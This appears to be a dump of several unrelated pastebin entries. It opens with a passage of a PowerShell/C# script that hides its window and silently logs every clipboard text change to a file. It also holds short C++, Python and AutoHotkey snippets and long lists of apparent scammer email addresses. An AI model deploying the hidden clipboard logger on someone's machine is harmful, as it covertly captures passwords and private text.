    public event Action<string> ClipboardTextChanged = delegate { };
 
    void HideForm()
    {
        FormBorderStyle = FormBorderStyle.None;
        ShowInTaskbar = false;
        Load += (sender, args) => { Size = new Size(0, 0); };
    }
 
    void RegisterWin32()
    {
        User32.AddClipboardFormatListener(Handle);
    }
 
    void UnregisterWin32()
    {
        if (IsHandleCreated)
            User32.RemoveClipboardFormatListener(Handle);
    }
 
    protected override void WndProc(ref Message m)
    {
        switch ((WM) m.Msg)
        {
            case WM.WM_CLIPBOARDUPDATE:
                ClipboardChanged();
                break;
 
            default:
                base.WndProc(ref m);
                break;
        }
    }
 
    void ClipboardChanged()
    {
        if (Clipboard.ContainsText())
            ClipboardTextChanged(Clipboard.GetText());
    }
}
 
public enum WM
{
    WM_CLIPBOARDUPDATE = 0x031D
}
 
public class User32
{
    const string User32Dll = ""User32.dll"";
 
    [DllImport(User32Dll, CharSet = CharSet.Auto)]
    public static extern bool AddClipboardFormatListener(IntPtr hWndObserver);
 
    [DllImport(User32Dll, CharSet = CharSet.Auto)]
    public static extern bool RemoveClipboardFormatListener(IntPtr hWndObserver);
}
""@
 
}
 
function Register-ClipboardTextChangedEvent
{
    param
    (
        [ScriptBlock] $Action
    )
    # before registering, unregister it, so there is no collision when you keep 
    # rerunning this thing during debugging and development.
    # the -EA flag tells it to run silently (as will throw an error if event is not already registered)
    Unregister-Event -SourceIdentifier ClipboardWatcher -EA 0
    $watcher = Register-ClipboardWatcher
    Register-ObjectEvent $watcher -EventName ClipboardTextChanged -Action $Action -SourceIdentifier ClipboardWatcher
}
 
Register-ClipboardTextChangedEvent -Action `
    {
        param
        (
            [string] $text
        )
 
        Add-Content -Path '.\text.txt' -Value $text -Encoding Unicode
    }"
jPdyfT1e,Untitled,Josif_tepe,C++,Thursday 29th of February 2024 11:23:27 AM CDT,"#include <iostream>
#include <vector>
//#include <bits/stdc++.h>
#include <cmath>
#include <fstream>
#include <cstring>
#include <algorithm>
using namespace std;
typedef long long ll;
const ll  maxn = 3e5 + 10;
const ll  logn = 18;
const ll  INF = 2e15;

int main() {
    ios_base::sync_with_stdio(false);
    int n, q;
    cin >> n >> q;
    
    vector<int> v(n);
    vector<int> idx(55, -1);
    for(int i = 0; i < n; i++) {
        cin >> v[i];
        if(idx[v[i]] == -1) {
            idx[v[i]] = i;
        }
    }
    
    for(int i = 0; i < q; i++) {
        int x;
        cin >> x;
        cout << idx[x] + 1 << "" "";
        for(int j = 1; j <= 50; j++){
            if(idx[j] != -1 and idx[j] < idx[x]) {
                idx[j]++;
            }
        }
        idx[x] = 0;
    }
    
    return 0;
}

"
zhvMeZyr,TutorialPipeline,peepoHapppy,Python,Thursday 29th of February 2024 10:29:49 AM CDT,"import matplotlib.pyplot as plt

from environment import TutorialSolverEnv
from algorithms import DoubleDQN
from pipeline import LoggingStudy

def main():
    env = TutorialSolverEnv()

    state_dim = env.state_dim
    action_n = env.action_n

    trajectory_max_len = 100
    episode_n = 400

    epsilon_decrease = 1 / (trajectory_max_len * episode_n)
    agent = DoubleDQN(
            state_dim, action_n, gamma=0.9, tau=0.001, epsilon_decrease=epsilon_decrease
        )
    study = LoggingStudy(env, agent, 100, 1)

    study.study_agent(100)

    rewards = study.rewards_log
    estimates = study.q_value_log

    plt.plot(rewards, '.', label='Rewards')
    plt.plot(estimates, '.', label='Estimates')
    plt.xlabel(""Trajectory"")
    plt.ylabel(""Reward"")
    plt.legend()
    plt.savefig(""figures/rewards.png"")
    plt.show()

    plt.plot(study.sprints_log, ""."")
    plt.title(""Sprints count"")
    plt.xlabel(""Trajectory"")
    plt.ylabel(""Sprint"")
    plt.savefig(""figures/sprints.png"")
    plt.show()

    plt.plot(study.loss_log, ""."")
    plt.title(""Loss"")
    plt.xlabel(""Steps"")
    plt.ylabel(""Loss"")
    plt.savefig(""figures/loss.png"")
    plt.show()

if __name__ == ""__main__"":
    main()
"
nH5hJYGw,params*,Lorenzo501,Autohotkey,Thursday 29th of February 2024 10:09:07 AM CDT,"#Requires AutoHotkey 2.0
Test(""a"", ""b"")

Test(params*)
{
    MsgBox(params*) ; msgbox text = a, msgbox title = b
    MsgBox(params[1]) ; msgbox text = a
    MsgBox(params[2]) ; msgbox text = b
}"
f3FcV2Q9,Untitled,MeehoweCK,C++,Thursday 29th of February 2024 10:02:59 AM CDT,"#include <iostream>
#include <ctime>
#include <cstdlib>

#define NEW_LINE std::cout << std::endl;

class Tablica2D {
	unsigned int W;
	unsigned int K;
	double** mTablica;
public:
	Tablica2D(unsigned int k, unsigned int w) : W{ w }, K{ k }, mTablica{ new double* [w] } {
		srand(time(nullptr));
		for (auto i{ 0 }; i < W; ++i) {
			mTablica[i] = new double[K];
			for (auto j{ 0 }; j < K; ++j) {
				mTablica[i][j] = 1.0 * rand() / RAND_MAX;
			}
		}
	}
	void print() const {
		for (auto i{ 0 }; i < W; ++i) {
			for (auto j{ 0 }; j < K; ++j) {
				std::cout << mTablica[i][j] << '\t';
			}
			NEW_LINE;
		}
	}
	~Tablica2D() {
		for (auto i{ 0 }; i < W; ++i) {
			delete[] mTablica[i];
		}
		delete[] mTablica;
	}
};

int main() {
	Tablica2D tablica{ 3, 8 };
	tablica.print();
	return 0;
}"
28wErf7b,Nigerian scammers [29-2-3/2024],bombaires,AIMMS,Thursday 29th of February 2024 09:57:05 AM CDT,"<a href=""mailto:unitednations.debtreco8899@gmail.com"">unitednations.debtreco8899@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+20161@gmail.com"">unitednations.debtreco8899+20161@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+7152@gmail.com"">unitednations.debtreco8899+7152@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+25158@gmail.com"">unitednations.debtreco8899+25158@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+21218@gmail.com"">unitednations.debtreco8899+21218@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+15160@gmail.com"">unitednations.debtreco8899+15160@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+13078@gmail.com"">unitednations.debtreco8899+13078@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+15942@gmail.com"">unitednations.debtreco8899+15942@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+32102@gmail.com"">unitednations.debtreco8899+32102@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+32032@gmail.com"">unitednations.debtreco8899+32032@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+572@gmail.com"">unitednations.debtreco8899+572@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+19405@gmail.com"">unitednations.debtreco8899+19405@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+24824@gmail.com"">unitednations.debtreco8899+24824@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+16917@gmail.com"">unitednations.debtreco8899+16917@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+29467@gmail.com"">unitednations.debtreco8899+29467@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+7223@gmail.com"">unitednations.debtreco8899+7223@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+18757@gmail.com"">unitednations.debtreco8899+18757@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+22294@gmail.com"">unitednations.debtreco8899+22294@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+3383@gmail.com"">unitednations.debtreco8899+3383@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+9221@gmail.com"">unitednations.debtreco8899+9221@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+10535@gmail.com"">unitednations.debtreco8899+10535@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+33@gmail.com"">unitednations.debtreco8899+33@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+3255@gmail.com"">unitednations.debtreco8899+3255@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+18579@gmail.com"">unitednations.debtreco8899+18579@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+19132@gmail.com"">unitednations.debtreco8899+19132@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+24250@gmail.com"">unitednations.debtreco8899+24250@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+11765@gmail.com"">unitednations.debtreco8899+11765@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+19963@gmail.com"">unitednations.debtreco8899+19963@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+10798@gmail.com"">unitednations.debtreco8899+10798@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+19328@gmail.com"">unitednations.debtreco8899+19328@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+13482@gmail.com"">unitednations.debtreco8899+13482@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+5552@gmail.com"">unitednations.debtreco8899+5552@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+17904@gmail.com"">unitednations.debtreco8899+17904@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+6879@gmail.com"">unitednations.debtreco8899+6879@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+886@gmail.com"">unitednations.debtreco8899+886@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+10769@gmail.com"">unitednations.debtreco8899+10769@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+3368@gmail.com"">unitednations.debtreco8899+3368@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+29504@gmail.com"">unitednations.debtreco8899+29504@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+2234@gmail.com"">unitednations.debtreco8899+2234@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+27626@gmail.com"">unitednations.debtreco8899+27626@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+1632@gmail.com"">unitednations.debtreco8899+1632@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+21553@gmail.com"">unitednations.debtreco8899+21553@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+29449@gmail.com"">unitednations.debtreco8899+29449@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+2494@gmail.com"">unitednations.debtreco8899+2494@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+13060@gmail.com"">unitednations.debtreco8899+13060@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+23759@gmail.com"">unitednations.debtreco8899+23759@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+2109@gmail.com"">unitednations.debtreco8899+2109@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+15912@gmail.com"">unitednations.debtreco8899+15912@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+8255@gmail.com"">unitednations.debtreco8899+8255@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+22104@gmail.com"">unitednations.debtreco8899+22104@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+22150@gmail.com"">unitednations.debtreco8899+22150@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+15626@gmail.com"">unitednations.debtreco8899+15626@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+28149@gmail.com"">unitednations.debtreco8899+28149@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+12480@gmail.com"">unitednations.debtreco8899+12480@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+19450@gmail.com"">unitednations.debtreco8899+19450@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+1160@gmail.com"">unitednations.debtreco8899+1160@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+26201@gmail.com"">unitednations.debtreco8899+26201@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+2881@gmail.com"">unitednations.debtreco8899+2881@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+20790@gmail.com"">unitednations.debtreco8899+20790@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+9391@gmail.com"">unitednations.debtreco8899+9391@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+26782@gmail.com"">unitednations.debtreco8899+26782@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+17216@gmail.com"">unitednations.debtreco8899+17216@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+16464@gmail.com"">unitednations.debtreco8899+16464@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+6943@gmail.com"">unitednations.debtreco8899+6943@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+19696@gmail.com"">unitednations.debtreco8899+19696@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+29812@gmail.com"">unitednations.debtreco8899+29812@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+17434@gmail.com"">unitednations.debtreco8899+17434@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+23959@gmail.com"">unitednations.debtreco8899+23959@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+31322@gmail.com"">unitednations.debtreco8899+31322@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+22716@gmail.com"">unitednations.debtreco8899+22716@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+18624@gmail.com"">unitednations.debtreco8899+18624@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+19098@gmail.com"">unitednations.debtreco8899+19098@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+14139@gmail.com"">unitednations.debtreco8899+14139@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+24609@gmail.com"">unitednations.debtreco8899+24609@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+5694@gmail.com"">unitednations.debtreco8899+5694@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+15843@gmail.com"">unitednations.debtreco8899+15843@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+17838@gmail.com"">unitednations.debtreco8899+17838@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+27606@gmail.com"">unitednations.debtreco8899+27606@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+18051@gmail.com"">unitednations.debtreco8899+18051@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+17209@gmail.com"">unitednations.debtreco8899+17209@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+30963@gmail.com"">unitednations.debtreco8899+30963@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+24276@gmail.com"">unitednations.debtreco8899+24276@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+20694@gmail.com"">unitednations.debtreco8899+20694@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+6912@gmail.com"">unitednations.debtreco8899+6912@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+19905@gmail.com"">unitednations.debtreco8899+19905@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+10005@gmail.com"">unitednations.debtreco8899+10005@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+16150@gmail.com"">unitednations.debtreco8899+16150@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+9121@gmail.com"">unitednations.debtreco8899+9121@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+984@gmail.com"">unitednations.debtreco8899+984@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+9221@gmail.com"">unitednations.debtreco8899+9221@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+10304@gmail.com"">unitednations.debtreco8899+10304@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+20997@gmail.com"">unitednations.debtreco8899+20997@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+3262@gmail.com"">unitednations.debtreco8899+3262@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+15238@gmail.com"">unitednations.debtreco8899+15238@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+17560@gmail.com"">unitednations.debtreco8899+17560@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+12123@gmail.com"">unitednations.debtreco8899+12123@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+20417@gmail.com"">unitednations.debtreco8899+20417@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+29504@gmail.com"">unitednations.debtreco8899+29504@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+20111@gmail.com"">unitednations.debtreco8899+20111@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+11851@gmail.com"">unitednations.debtreco8899+11851@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+3658@gmail.com"">unitednations.debtreco8899+3658@gmail.com</a>"
67dJYueD,Nigerian scammers [29-2-2/2024],bombaires,AIMMS,Thursday 29th of February 2024 09:56:04 AM CDT,"<a href=""mailto:file45amb@outlook.com"">file45amb@outlook.com</a>
<a href=""mailto:paymentfille087@gmail.com"">paymentfille087@gmail.com</a>
<a href=""mailto:olakunleade@outlook.com"">olakunleade@outlook.com</a>
<a href=""mailto:pa.ym.e.n.tfi.l.le.0.87@gmail.com"">pa.ym.e.n.tfi.l.le.0.87@gmail.com</a>
<a href=""mailto:pay.me.n.t.f.i.l.l.e.0.87@gmail.com"">pay.me.n.t.f.i.l.l.e.0.87@gmail.com</a>
<a href=""mailto:p.a.y.m.en.tfi.lle.08.7@gmail.com"">p.a.y.m.en.tfi.lle.08.7@gmail.com</a>
<a href=""mailto:p.ay.m.en.t.fi.l.le.08.7@gmail.com"">p.ay.m.en.t.fi.l.le.08.7@gmail.com</a>
<a href=""mailto:p.a.yme.ntfi.l.l.e.08.7@gmail.com"">p.a.yme.ntfi.l.l.e.08.7@gmail.com</a>
<a href=""mailto:p.ay.m.en.tfi.lle0.8.7@gmail.com"">p.ay.m.en.tfi.lle0.8.7@gmail.com</a>
<a href=""mailto:paym.e.nt.f.il.le.0.8.7@gmail.com"">paym.e.nt.f.il.le.0.8.7@gmail.com</a>
<a href=""mailto:p.ay.ment.fi.ll.e.087@gmail.com"">p.ay.ment.fi.ll.e.087@gmail.com</a>
<a href=""mailto:p.aymen.t.fi.ll.e08.7@gmail.com"">p.aymen.t.fi.ll.e08.7@gmail.com</a>
<a href=""mailto:paym.e.n.t.fille0.87@gmail.com"">paym.e.n.t.fille0.87@gmail.com</a>
<a href=""mailto:pa.ym.ent.f.i.ll.e0.87@gmail.com"">pa.ym.ent.f.i.ll.e0.87@gmail.com</a>
<a href=""mailto:pa.ymentfi.ll.e0.87@gmail.com"">pa.ymentfi.ll.e0.87@gmail.com</a>
<a href=""mailto:p.ay.me.n.tf.ille.08.7@gmail.com"">p.ay.me.n.tf.ille.08.7@gmail.com</a>
<a href=""mailto:pa.yment.f.i.ll.e.0.8.7@gmail.com"">pa.yment.f.i.ll.e.0.8.7@gmail.com</a>
<a href=""mailto:pa.y.me.ntf.ille.0.87@gmail.com"">pa.y.me.ntf.ille.0.87@gmail.com</a>
<a href=""mailto:pay.m.e.nt.fil.le08.7@gmail.com"">pay.m.e.nt.fil.le08.7@gmail.com</a>
<a href=""mailto:p.a.y.mentfil.l.e.0.8.7@gmail.com"">p.a.y.mentfil.l.e.0.8.7@gmail.com</a>
<a href=""mailto:pay.m.ent.fi.ll.e087@gmail.com"">pay.m.ent.fi.ll.e087@gmail.com</a>
<a href=""mailto:p.ay.ment.fi.lle.0.87@gmail.com"">p.ay.ment.fi.lle.0.87@gmail.com</a>
<a href=""mailto:p.ay.mentf.i.lle.0.87@gmail.com"">p.ay.mentf.i.lle.0.87@gmail.com</a>
<a href=""mailto:p.ayme.n.t.fi.ll.e.087@gmail.com"">p.ayme.n.t.fi.ll.e.087@gmail.com</a>
<a href=""mailto:p.a.y.m.entfill.e087@gmail.com"">p.a.y.m.entfill.e087@gmail.com</a>
<a href=""mailto:pa.ym.e.nt.f.il.l.e087@gmail.com"">pa.ym.e.nt.f.il.l.e087@gmail.com</a>
<a href=""mailto:pa.ym.e.n.tfil.le.0.8.7@gmail.com"">pa.ym.e.n.tfil.le.0.8.7@gmail.com</a>
<a href=""mailto:pa.ym.e.ntfille.08.7@gmail.com"">pa.ym.e.ntfille.08.7@gmail.com</a>
<a href=""mailto:pa.y.ment.fi.lle087@gmail.com"">pa.y.ment.fi.lle087@gmail.com</a>
<a href=""mailto:pa.y.m.en.t.fi.l.l.e.0.8.7@gmail.com"">pa.y.m.en.t.fi.l.l.e.0.8.7@gmail.com</a>
<a href=""mailto:pay.m.ent.f.ille0.87@gmail.com"">pay.m.ent.f.ille0.87@gmail.com</a>
<a href=""mailto:p.a.ym.en.t.fi.l.le.0.8.7@gmail.com"">p.a.ym.en.t.fi.l.le.0.8.7@gmail.com</a>
<a href=""mailto:pa.y.m.ent.f.i.ll.e.087@gmail.com"">pa.y.m.ent.f.i.ll.e.087@gmail.com</a>
<a href=""mailto:pa.y.mentf.i.lle.087@gmail.com"">pa.y.mentf.i.lle.087@gmail.com</a>
<a href=""mailto:pa.yment.fille0.87@gmail.com"">pa.yment.fille0.87@gmail.com</a>
<a href=""mailto:pay.m.e.n.t.fi.ll.e08.7@gmail.com"">pay.m.e.n.t.fi.ll.e08.7@gmail.com</a>
<a href=""mailto:pa.y.m.e.n.t.f.il.l.e0.8.7@gmail.com"">pa.y.m.e.n.t.f.il.l.e0.8.7@gmail.com</a>
<a href=""mailto:paymen.tf.ille.0.8.7@gmail.com"">paymen.tf.ille.0.8.7@gmail.com</a>
<a href=""mailto:p.ayme.nt.f.i.l.l.e08.7@gmail.com"">p.ayme.nt.f.i.l.l.e08.7@gmail.com</a>
<a href=""mailto:p.a.ym.ent.f.i.lle.0.87@gmail.com"">p.a.ym.ent.f.i.lle.0.87@gmail.com</a>
<a href=""mailto:p.ay.me.nt.fi.lle.0.87@gmail.com"">p.ay.me.nt.fi.lle.0.87@gmail.com</a>
<a href=""mailto:pay.m.en.t.f.i.l.l.e.0.8.7@gmail.com"">pay.m.en.t.f.i.l.l.e.0.8.7@gmail.com</a>
<a href=""mailto:payme.n.tf.i.ll.e.0.8.7@gmail.com"">payme.n.tf.i.ll.e.0.8.7@gmail.com</a>
<a href=""mailto:p.ay.ment.fi.lle.08.7@gmail.com"">p.ay.ment.fi.lle.08.7@gmail.com</a>
<a href=""mailto:p.ay.me.nt.fille.0.8.7@gmail.com"">p.ay.me.nt.fille.0.8.7@gmail.com</a>
<a href=""mailto:p.a.ym.e.n.tfill.e0.87@gmail.com"">p.a.ym.e.n.tfill.e0.87@gmail.com</a>
<a href=""mailto:p.a.yme.nt.f.i.l.l.e087@gmail.com"">p.a.yme.nt.f.i.l.l.e087@gmail.com</a>
<a href=""mailto:pay.ment.fil.l.e.087@gmail.com"">pay.ment.fil.l.e.087@gmail.com</a>
<a href=""mailto:p.a.yme.n.tfill.e087@gmail.com"">p.a.yme.n.tfill.e087@gmail.com</a>
<a href=""mailto:pa.ym.e.n.t.f.ille.0.87@gmail.com"">pa.ym.e.n.t.f.ille.0.87@gmail.com</a>
<a href=""mailto:p.a.y.mentf.i.lle.08.7@gmail.com"">p.a.y.mentf.i.lle.08.7@gmail.com</a>
<a href=""mailto:pa.ym.en.t.f.i.lle.0.87@gmail.com"">pa.ym.en.t.f.i.lle.0.87@gmail.com</a>
<a href=""mailto:p.ay.me.n.tf.il.l.e.087@gmail.com"">p.ay.me.n.tf.il.l.e.087@gmail.com</a>
<a href=""mailto:p.a.ym.ent.f.i.ll.e.0.87@gmail.com"">p.a.ym.ent.f.i.ll.e.0.87@gmail.com</a>
<a href=""mailto:pa.ymen.t.f.ille.0.8.7@gmail.com"">pa.ymen.t.f.ille.0.8.7@gmail.com</a>
<a href=""mailto:paym.en.t.fi.l.l.e08.7@gmail.com"">paym.en.t.fi.l.l.e08.7@gmail.com</a>
<a href=""mailto:p.ay.me.n.tf.ille087@gmail.com"">p.ay.me.n.tf.ille087@gmail.com</a>
<a href=""mailto:p.ay.m.ent.fi.l.le.087@gmail.com"">p.ay.m.ent.fi.l.le.087@gmail.com</a>
<a href=""mailto:p.a.ym.e.n.tfi.l.l.e.0.8.7@gmail.com"">p.a.ym.e.n.tfi.l.l.e.0.8.7@gmail.com</a>
<a href=""mailto:pa.ym.en.t.fi.lle0.8.7@gmail.com"">pa.ym.en.t.fi.lle0.8.7@gmail.com</a>
<a href=""mailto:pa.ym.ent.fil.le.087@gmail.com"">pa.ym.ent.fil.le.087@gmail.com</a>
<a href=""mailto:pa.ym.ent.f.il.l.e08.7@gmail.com"">pa.ym.ent.f.il.l.e08.7@gmail.com</a>
<a href=""mailto:pa.yme.ntfil.le.0.8.7@gmail.com"">pa.yme.ntfil.le.0.8.7@gmail.com</a>
<a href=""mailto:p.ayme.nt.fi.l.l.e.0.8.7@gmail.com"">p.ayme.nt.fi.l.l.e.0.8.7@gmail.com</a>
<a href=""mailto:pay.m.entfill.e.0.8.7@gmail.com"">pay.m.entfill.e.0.8.7@gmail.com</a>
<a href=""mailto:paymentfi.ll.e08.7@gmail.com"">paymentfi.ll.e08.7@gmail.com</a>
<a href=""mailto:p.ay.m.ent.f.i.l.le.08.7@gmail.com"">p.ay.m.ent.f.i.l.le.08.7@gmail.com</a>
<a href=""mailto:p.a.y.m.e.ntfill.e.0.87@gmail.com"">p.a.y.m.e.ntfill.e.0.87@gmail.com</a>
<a href=""mailto:p.a.y.m.entf.i.l.l.e0.87@gmail.com"">p.a.y.m.entf.i.l.l.e0.87@gmail.com</a>
<a href=""mailto:pa.ym.entf.il.l.e08.7@gmail.com"">pa.ym.entf.il.l.e08.7@gmail.com</a>
<a href=""mailto:pa.yme.n.t.fill.e.0.87@gmail.com"">pa.yme.n.t.fill.e.0.87@gmail.com</a>
<a href=""mailto:p.a.y.m.e.n.t.f.i.lle.087@gmail.com"">p.a.y.m.e.n.t.f.i.lle.087@gmail.com</a>
<a href=""mailto:pa.ym.e.nt.f.i.l.l.e087@gmail.com"">pa.ym.e.nt.f.i.l.l.e087@gmail.com</a>
<a href=""mailto:pay.me.nt.f.i.lle087@gmail.com"">pay.me.nt.f.i.lle087@gmail.com</a>
<a href=""mailto:p.a.y.me.nt.fil.l.e.0.8.7@gmail.com"">p.a.y.me.nt.fil.l.e.0.8.7@gmail.com</a>
<a href=""mailto:p.ayment.fill.e0.87@gmail.com"">p.ayment.fill.e0.87@gmail.com</a>
<a href=""mailto:pa.y.m.en.t.f.i.l.l.e08.7@gmail.com"">pa.y.m.en.t.f.i.l.l.e08.7@gmail.com</a>
<a href=""mailto:payme.n.tfill.e.087@gmail.com"">payme.n.tfill.e.087@gmail.com</a>
<a href=""mailto:paymentf.i.l.l.e.08.7@gmail.com"">paymentf.i.l.l.e.08.7@gmail.com</a>
<a href=""mailto:pa.y.men.t.fill.e087@gmail.com"">pa.y.men.t.fill.e087@gmail.com</a>
<a href=""mailto:p.a.y.m.ent.f.i.ll.e08.7@gmail.com"">p.a.y.m.ent.f.i.ll.e08.7@gmail.com</a>
<a href=""mailto:p.ay.m.e.n.t.fil.l.e.08.7@gmail.com"">p.ay.m.e.n.t.fil.l.e.08.7@gmail.com</a>
<a href=""mailto:p.ay.m.e.n.t.fill.e0.87@gmail.com"">p.ay.m.e.n.t.fill.e0.87@gmail.com</a>
<a href=""mailto:paym.e.n.t.fil.l.e.0.8.7@gmail.com"">paym.e.n.t.fil.l.e.0.8.7@gmail.com</a>
<a href=""mailto:pa.ym.e.nt.fil.l.e087@gmail.com"">pa.ym.e.nt.fil.l.e087@gmail.com</a>
<a href=""mailto:pa.y.m.entf.i.l.le0.8.7@gmail.com"">pa.y.m.entf.i.l.le0.8.7@gmail.com</a>
<a href=""mailto:pay.ment.f.ille0.8.7@gmail.com"">pay.ment.f.ille0.8.7@gmail.com</a>
<a href=""mailto:p.aym.en.t.fi.l.le.087@gmail.com"">p.aym.en.t.fi.l.le.087@gmail.com</a>
<a href=""mailto:p.ayment.fi.l.le.0.87@gmail.com"">p.ayment.fi.l.le.0.87@gmail.com</a>
<a href=""mailto:p.a.ym.e.ntf.i.l.l.e.0.87@gmail.com"">p.a.ym.e.ntf.i.l.l.e.0.87@gmail.com</a>
<a href=""mailto:p.ay.m.e.n.tfi.l.l.e0.87@gmail.com"">p.ay.m.e.n.tfi.l.l.e0.87@gmail.com</a>
<a href=""mailto:p.ayme.n.tf.i.l.l.e0.87@gmail.com"">p.ayme.n.tf.i.l.l.e0.87@gmail.com</a>
<a href=""mailto:p.a.ym.e.nt.f.i.ll.e.087@gmail.com"">p.a.ym.e.nt.f.i.ll.e.087@gmail.com</a>
<a href=""mailto:p.a.y.m.e.n.t.fi.l.le.0.87@gmail.com"">p.a.y.m.e.n.t.fi.l.le.0.87@gmail.com</a>
<a href=""mailto:p.a.y.m.e.n.tfill.e.08.7@gmail.com"">p.a.y.m.e.n.tfill.e.08.7@gmail.com</a>
<a href=""mailto:p.aym.en.tf.i.l.le.087@gmail.com"">p.aym.en.tf.i.l.le.087@gmail.com</a>
<a href=""mailto:p.a.y.ment.f.i.ll.e.087@gmail.com"">p.a.y.ment.f.i.ll.e.087@gmail.com</a>
<a href=""mailto:p.aym.e.n.t.fil.le0.87@gmail.com"">p.aym.e.n.t.fil.le0.87@gmail.com</a>
<a href=""mailto:pa.y.men.t.fi.ll.e08.7@gmail.com"">pa.y.men.t.fi.ll.e08.7@gmail.com</a>
<a href=""mailto:p.a.y.me.ntfi.ll.e0.8.7@gmail.com"">p.a.y.me.ntfi.ll.e0.8.7@gmail.com</a>
<a href=""mailto:pay.me.n.t.f.i.lle0.87@gmail.com"">pay.me.n.t.f.i.lle0.87@gmail.com</a>
<a href=""mailto:paymen.t.fi.ll.e08.7@gmail.com"">paymen.t.fi.ll.e08.7@gmail.com</a>
<a href=""mailto:pa.y.mentf.ille.0.8.7@gmail.com"">pa.y.mentf.ille.0.8.7@gmail.com</a>
<a href=""mailto:pa.ymentfil.le087@gmail.com"">pa.ymentfil.le087@gmail.com</a>
<a href=""mailto:pa.y.m.en.t.f.i.ll.e.0.8.7@gmail.com"">pa.y.m.en.t.f.i.ll.e.0.8.7@gmail.com</a>
